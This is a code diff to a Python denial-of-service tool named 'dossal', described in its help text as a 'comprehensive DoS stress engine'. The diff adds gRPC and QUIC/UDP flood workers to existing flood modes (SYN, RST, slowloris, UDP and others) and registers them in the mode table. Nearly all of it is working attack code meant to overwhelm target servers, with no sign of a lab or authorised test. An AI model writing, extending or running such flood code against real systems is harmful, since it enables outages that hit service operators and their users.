@@ -8,6 +8,8 @@ Modes:
   tcp        : raw TCP byte flood
   udp        : raw UDP datagram flood
   h2         : HTTP/2 multiplexed request flood
+  grpc       : gRPC (HTTP/2 + gRPC framing) request flood
+  quic       : QUIC/HTTP3 UDP datagram flood (simulated Initial packets)
   syn        : TCP SYN flood (connect-only, no read)
   synack     : TCP connect + immediate close (ACK flood / connection exhaustion)
   rst        : TCP RST flood (connect → send RST via close)
@@ -23,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "0.6"
+VERSION = "0.8"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -331,6 +333,100 @@ async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
     except Exception:
         pass
 
+# ── gRPC worker: HTTP/2 + gRPC framing ──────────────────────────
+async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
+    host, port, path = parse_http(url)
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    ctx.set_alpn_protocols(['h2'])
+    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
+    config = H2Configuration(client_side=True)
+    conn = H2Connection(config=config)
+    conn.initiate_connection()
+    writer.write(conn.data_to_send())
+    await writer.drain()
+    try:
+        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
+        conn.receive_data(data)
+    except Exception:
+        pass
+    
+    # gRPC headers
+    headers = [
+        (':method', 'POST'),
+        (':scheme', 'https'),
+        (':authority', host),
+        (':path', path),
+        ('content-type', 'application/grpc'),
+        ('te', 'trailers'),
+        ('user-agent', f'dossal/{VERSION}'),
+    ]
+    # gRPC request frame: 1-byte flag + 4-byte length + payload
+    grpc_payload = b'X' * max(1, payload_size)
+    payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
+    error = None
+    while not stop.is_set():
+        try:
+            stream_id = conn.get_next_available_stream_id()
+            conn.send_headers(stream_id, headers, end_stream=False)
+            conn.send_data(stream_id, payload, end_stream=True)
+            data = conn.data_to_send()
+            if data:
+                writer.write(data); await writer.drain()
+            # Read response
+            got_response = False
+            deadline = time.time() + 3.0
+            while time.time() < deadline and not got_response:
+                chunk = await asyncio.wait_for(reader.read(8192), timeout=max(0.1, deadline - time.time()))
+                if not chunk:
+                    break
+                events = conn.receive_data(chunk)
+                for event in events:
+                    if isinstance(event, ResponseReceived):
+                        stats.requests += 1
+                        stats.bytes += len(chunk)
+                        got_response = True
+                        break
+                    elif isinstance(event, DataReceived):
+                        stats.bytes += len(event.data)
+        except Exception as e:
+            stats.errors += 1
+            error = e
+            break
+    if error and name == 0:
+        print(f"grpc_worker[{name}] error: {error}", file=sys.stderr)
+    if writer.transport:
+        writer.transport.close()
+    try:
+        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
+    except Exception:
+        pass
+
+# ── QUIC/HTTP3 worker: raw UDP with QUIC-like framing ───────────
+async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
+    host, port = parse_udp(url)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # QUIC Initial packet-like payload
+    # Real QUIC has long headers; we simulate with a realistic size
+    payload = b'\xc0' + b'\x00' * 4 + b'\x00' * 8 + (b'X' * min(payload_size, 1200))
+    loop = asyncio.get_event_loop()
+    pending = 0
+    max_pending = 20000
+    while not stop.is_set():
+        try:
+            if pending >= max_pending:
+                await asyncio.sleep(0.001)
+                continue
+            pending += 1
+            loop.run_in_executor(None, sock.sendto, (payload, (host, port)))
+            stats.bytes += len(payload)
+            stats.packets += 1
+        except Exception:
+            stats.errors += 1
+            break
+    sock.close()
+
 # ── SYN flood: connect only, never read ──────────────────────────
 async def syn_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
@@ -423,6 +519,8 @@ WORKERS = {
     "udp":       udp_worker,
     "udy":       udp_worker,
     "h2":        h2_worker,
+    "grpc":      grpc_worker,
+    "quic":      quic_worker,
     "syn":       syn_worker,
     "synack":    synack_worker,
     "rst":       rst_worker,
@@ -432,7 +530,7 @@ WORKERS = {
 
 DEFAULT_PAYLOADS = {
     "http": 0, "https": 0, "websocket": 128, "tcp": 1024,
-    "udp": 1400, "h2": 1024, "syn": 0, "synack": 0,
+    "udp": 1400, "h2": 1024, "grpc": 1024, "quic": 1400, "syn": 0, "synack": 0,
     "rst": 1, "fin": 0, "slowloris": 0,
 }
 
@@ -541,7 +639,7 @@ async def run(modes, url, conns, duration, stats, payload_size):
 def main():
     ap = argparse.ArgumentParser(description="dossal v" + VERSION + " — comprehensive DoS stress engine")
     ap.add_argument("--mode", default="http",
-        help="Comma-separated modes: http,https,websocket,tcp,udp,h2,syn,synack,rst,fin,slowloris")
+        help="Comma-separated modes: http,https,websocket,tcp,udp,h2,grpc,quic,syn,synack,rst,fin,slowloris")
     ap.add_argument("--url", required=True)
     ap.add_argument("--connections", type=int, default=100,
         help="Connections per mode (default: 100)")
